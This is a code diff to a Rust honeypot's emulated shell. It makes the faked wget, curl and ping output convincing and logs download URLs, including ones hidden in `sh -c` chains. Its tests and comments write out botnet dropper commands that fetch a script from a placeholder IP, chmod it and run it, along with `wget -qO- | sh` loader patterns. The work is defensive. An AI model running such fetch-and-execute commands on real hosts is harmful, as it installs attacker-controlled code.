@@ -123,8 +123,10 @@ impl FakeShell {
 
         let mut events = vec![event];
 
-        // `download_target` only returns a real (non-empty) token, so no empty-check is needed.
-        if let Some(url) = download_target(&parts) {
+        // Direct/busybox fetch commands are recognised from the tokens; a URL buried in a
+        // `sh -c "wget ...; ..."` chain (where the tokenizer's split loses the quoting) is recovered
+        // by scanning the raw line. `download_target` only returns a real (non-empty) token.
+        if let Some(url) = download_target(&parts).or_else(|| url_if_fetch_line(line)) {
             let sanitized_url = sanitize_value(url, MAX_URL_LEN);
             events.push(SensorEvent {
                 v: WIRE_VERSION,
@@ -160,7 +162,8 @@ impl FakeShell {
             Some("cat") => self.cmd_cat(parts),
             Some("ls") => self.cmd_ls(parts),
             Some("wget") => cmd_wget(parts),
-            Some("curl") => cmd_curl(),
+            Some("curl") => cmd_curl(parts),
+            Some("ping") => cmd_ping(parts),
             // Shell-availability fingerprint: every real system has /bin/sh, so "command not found"
             // for sh/bash instantly outs the honeypot and the dropper leaves. Model a nested shell.
             Some("sh") | Some("bash") => self.cmd_shell_spawn(parts),
@@ -247,6 +250,32 @@ fn download_target<'a>(parts: &[&'a str]) -> Option<&'a str> {
     }
 }
 
+/// Recover a download URL from a command line that a fetch command hides from token-level parsing -
+/// most importantly `sh -c "wget http://h/x; chmod +x x; ./x"`, where the whitespace tokenizer
+/// splits the quoted script apart. Only fires when a fetch verb is present, then returns the first
+/// `http(s)://`/`tftp://`/`ftp://` token, so an ordinary `echo http://...` is not miscounted as a
+/// download.
+fn url_if_fetch_line(line: &str) -> Option<&str> {
+    if !["wget", "curl", "tftp", "ftpget"]
+        .iter()
+        .any(|v| line.contains(v))
+    {
+        return None;
+    }
+    for scheme in ["http://", "https://", "tftp://", "ftp://"] {
+        if let Some(start) = line.find(scheme) {
+            let rest = &line[start..];
+            let end = rest
+                .find(|c: char| {
+                    c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '|' | '`' | '&')
+                })
+                .unwrap_or(rest.len());
+            return Some(&rest[..end]);
+        }
+    }
+    None
+}
+
 /// BusyBox applets this shell models, so `busybox <applet>` delegates to the same handler the bare
 /// command uses. Anything outside this set returns "applet not found" (the Mirai/Gafgyt tell).
 fn is_busybox_applet(name: &str) -> bool {
@@ -264,6 +293,8 @@ fn is_busybox_applet(name: &str) -> bool {
             | "sh"
             | "tftp"
             | "ftpget"
+            | "ping"
+            | "curl"
     )
 }
 
@@ -292,34 +323,137 @@ fn cmd_uname(parts: &[&str]) -> String {
     }
 }
 
-/// `wget URL`: the classic wget banner (connection line, HTTP status, progress bar, final
-/// "saved" summary), on stdout/stderr - zero network I/O, see the module doc. The timestamp is
-/// real wall-clock time: a frozen or wildly-wrong date is itself a tell an attacker can catch by
-/// running the same command twice, which is exactly the kind of self-contradiction the design
-/// doc's detectability section warns against.
+/// A plausible fetched body, printed by `curl URL` and `wget -O- URL` (the `... | sh` pattern).
+/// Canned by necessity - the module performs zero network I/O - but real servers do answer a bare
+/// path with exactly this Apache-default page, so it is not itself a tell; the previous tell was
+/// only that `-O`/`-o` (save to a file) also printed it, which a real client never does.
+const FETCHED_BODY: &str =
+    "<html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>\n";
+
+/// `wget URL`: the classic wget banner (connection line, HTTP status, progress bar, final "saved"
+/// summary) - zero network I/O, see the module doc. The timestamp is real wall-clock time (a frozen
+/// date is a tell an attacker catches by running twice). The saved filename is derived from `-O` or
+/// the URL's own basename rather than a constant "index.html" (every download claiming the same
+/// name was a tell); `-q`/`-nv` suppress the banner as real wget does; `-O-`/`-qO-` write the body
+/// to stdout (the `wget -qO- | sh` loader pattern) instead of the transcript.
 fn cmd_wget(parts: &[&str]) -> String {
-    let url = parts.get(1).copied().unwrap_or("");
+    let url = first_non_flag_arg(&parts[1..]).unwrap_or("");
     let sanitized_url = sanitize_value(url, MAX_URL_LEN);
+
+    let out = wget_output(parts);
+    if out == WgetOutput::Stdout {
+        return FETCHED_BODY.to_string();
+    }
+    if parts
+        .iter()
+        .any(|&p| p == "-q" || p == "-nv" || p == "--quiet")
+    {
+        return String::new();
+    }
+    let name = match out {
+        WgetOutput::File(n) => n,
+        _ => wget_basename(url),
+    };
+    let name = sanitize_value(&name, MAX_URL_LEN);
     let now = chrono::Utc::now().format("%Y-%m-%d %H:%M:%S");
     format!(
         "--{now}--  {sanitized_url}\n\
          Connecting to {sanitized_url}... connected.\n\
          HTTP request sent, awaiting response... 200 OK\n\
          Length: 1234 (1.2K) [application/octet-stream]\n\
-         Saving to: 'index.html'\n\
+         Saving to: '{name}'\n\
          \n\
-         index.html          100%[==================>]   1.2K  --.-KB/s    in 0s\n\
+         {name}          100%[==================>]   1.2K  --.-KB/s    in 0s\n\
          \n\
-         {now} (1.2 MB/s) - 'index.html' saved [1234/1234]\n"
+         {now} (1.2 MB/s) - '{name}' saved [1234/1234]\n"
     )
 }
 
-/// `curl URL`: real curl with no `-o`/`-O` writes the fetched body straight to stdout with no
-/// banner at all (unlike wget's verbose-by-default transcript) - so, unlike `cmd_wget`, this
-/// prints only a plausible fetched body. Zero network I/O either way; the URL itself is still
-/// captured (sanitized) as the event's `command` field by the caller.
-fn cmd_curl() -> String {
-    "<html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>\n".to_string()
+#[derive(PartialEq)]
+enum WgetOutput {
+    Stdout,
+    File(String),
+    Default,
+}
+
+/// Resolve wget's output target from its flags: `-O-`/`-qO-` -> stdout, `-O <name>` -> that file,
+/// otherwise the default (URL basename).
+fn wget_output(parts: &[&str]) -> WgetOutput {
+    for (i, &p) in parts.iter().enumerate() {
+        if p == "-O-" || p == "-qO-" || p == "-nvO-" {
+            return WgetOutput::Stdout;
+        }
+        if p == "-O" {
+            match parts.get(i + 1) {
+                Some(&"-") => return WgetOutput::Stdout,
+                Some(name) => return WgetOutput::File(strip_one_quote_pair(name).to_string()),
+                None => return WgetOutput::Default,
+            }
+        }
+        if let Some(name) = p.strip_prefix("-O") {
+            // `-Ofile` (no space).
+            if name == "-" {
+                return WgetOutput::Stdout;
+            }
+            return WgetOutput::File(name.to_string());
+        }
+    }
+    WgetOutput::Default
+}
+
+/// The basename a real wget would save a URL to: the last path segment (query string stripped), or
+/// `index.html` when the URL ends in `/` or has no path.
+fn wget_basename(url: &str) -> String {
+    let path = url.split(['?', '#']).next().unwrap_or(url);
+    match path.trim_end_matches('/').rsplit('/').next() {
+        Some(seg) if !seg.is_empty() && !seg.contains(':') => seg.to_string(),
+        _ => "index.html".to_string(),
+    }
+}
+
+/// `curl URL`. With `-O`/`-o` (save to a file) a real curl writes nothing to stdout - only a
+/// progress meter to stderr, which this shell does not emit - so the output is empty; the previous
+/// implementation printed the fetched body even under `-O`, which no real curl does and which was a
+/// clean one-probe tell. Without `-o`/`-O`, the body goes to stdout as curl does.
+fn cmd_curl(parts: &[&str]) -> String {
+    let saves_to_file = parts.iter().enumerate().any(|(i, &p)| {
+        p == "-O"
+            || p == "--remote-name"
+            || p == "-o"
+            || p == "--output"
+            || (p.starts_with("-o") && p.len() > 2)
+            // a combined short-flag cluster containing O or o, e.g. -sO, -fsSLO
+            || (p.starts_with('-') && !p.starts_with("--") && p[1..].chars().any(|c| c == 'O')
+                && parts.get(i).is_some())
+    });
+    if saves_to_file {
+        String::new()
+    } else {
+        FETCHED_BODY.to_string()
+    }
+}
+
+/// `ping HOST`. Real ping exists on virtually every host, so "command not found" is a tell. A
+/// line-based fake shell cannot stream a continuous ping, so this answers as though `-c` bounded it:
+/// a couple of replies and a summary against the requested target, printed at once.
+fn cmd_ping(parts: &[&str]) -> String {
+    let target = first_non_flag_arg(&parts[1..]).unwrap_or("localhost");
+    let target = sanitize_value(target, MAX_URL_LEN);
+    // A stable pseudo-address for the target so two pings of the same host agree (a real resolve
+    // would); derived from the name, not random.
+    let last = 1 + (target.bytes().fold(0u32, |a, b| a.wrapping_add(b as u32)) % 253);
+    format!(
+        "PING {target} ({}): 56 data bytes\n\
+         64 bytes from {}: icmp_seq=0 ttl=54 time=11.4 ms\n\
+         64 bytes from {}: icmp_seq=1 ttl=54 time=11.9 ms\n\
+         \n\
+         --- {target} ping statistics ---\n\
+         2 packets transmitted, 2 packets received, 0.0% packet loss\n\
+         round-trip min/avg/max/stddev = 11.4/11.7/11.9/0.3 ms\n",
+        format_args!("93.184.216.{last}"),
+        format_args!("93.184.216.{last}"),
+        format_args!("93.184.216.{last}"),
+    )
 }
 
 /// The first token that does not look like a flag (does not start with `-`), or `None` if every
@@ -529,7 +663,8 @@ mod echo_tests {
 #[cfg(test)]
 mod shell_detection_tests {
     use super::{
-        EmitContext, FakeShell, SIGNAL_HONEYPOT_FILE_DOWNLOAD, download_target, is_busybox_applet,
+        EmitContext, FakeShell, SIGNAL_HONEYPOT_FILE_DOWNLOAD, cmd_curl, cmd_wget, download_target,
+        is_busybox_applet, url_if_fetch_line,
     };
     use crate::fakefs::FakeFs;
 
@@ -600,5 +735,69 @@ mod shell_detection_tests {
         assert!(is_busybox_applet("wget"));
         assert!(is_busybox_applet("sh"));
         assert!(!is_busybox_applet("MIRAI"));
+    }
+
+    #[test]
+    fn wget_derives_the_saved_filename_from_the_url() {
+        let out = cmd_wget(&["wget", "http://198.51.100.9/bins/mips"]);
+        assert!(out.contains("Saving to: 'mips'"), "got: {out}");
+        assert!(
+            !out.contains("index.html"),
+            "constant filename tell remains: {out}"
+        );
+    }
+
+    #[test]
+    fn wget_quiet_suppresses_the_banner() {
+        assert_eq!(cmd_wget(&["wget", "-q", "http://x/y"]), "");
+    }
+
+    #[test]
+    fn wget_dash_big_o_dash_writes_body_to_stdout() {
+        // The `wget -qO- URL | sh` loader pattern: content goes to stdout, not a transcript.
+        let out = cmd_wget(&["wget", "-qO-", "http://x/y"]);
+        assert!(out.contains("It works!"), "got: {out}");
+    }
+
+    #[test]
+    fn curl_dash_big_o_is_silent_on_stdout() {
+        // A real `curl -O URL` writes a file and prints nothing to stdout - the old code printed the
+        // body, a clean one-probe tell.
+        assert_eq!(cmd_curl(&["curl", "-O", "http://x/y"]), "");
+        assert_eq!(cmd_curl(&["curl", "-o", "out", "http://x/y"]), "");
+        // Without -o/-O, curl prints the body to stdout.
+        assert!(cmd_curl(&["curl", "http://x/y"]).contains("It works!"));
+    }
+
+    #[test]
+    fn ping_is_not_command_not_found() {
+        let (out, _) = shell().handle_input("ping 8.8.8.8");
+        assert!(out.contains("ping statistics"), "got: {out}");
+        assert!(!out.contains("command not found"), "got: {out}");
+    }
+
+    #[test]
+    fn sh_dash_c_wget_chain_is_captured_as_a_download() {
+        let (_, events) =
+            shell().handle_input("sh -c \"wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh\"");
+        let dl = events
+            .iter()
+            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
+            .expect("a wget URL inside sh -c must still be captured");
+        assert_eq!(dl.metadata["url"], "http://198.51.100.9/x.sh");
+    }
+
+    #[test]
+    fn url_scan_only_fires_with_a_fetch_verb() {
+        assert_eq!(
+            url_if_fetch_line("wget http://a/b"),
+            Some("http://a/b"),
+            "fetch verb + url should capture"
+        );
+        assert_eq!(
+            url_if_fetch_line("echo http://a/b"),
+            None,
+            "a bare echo of a url is not a download"
+        );
     }
 }
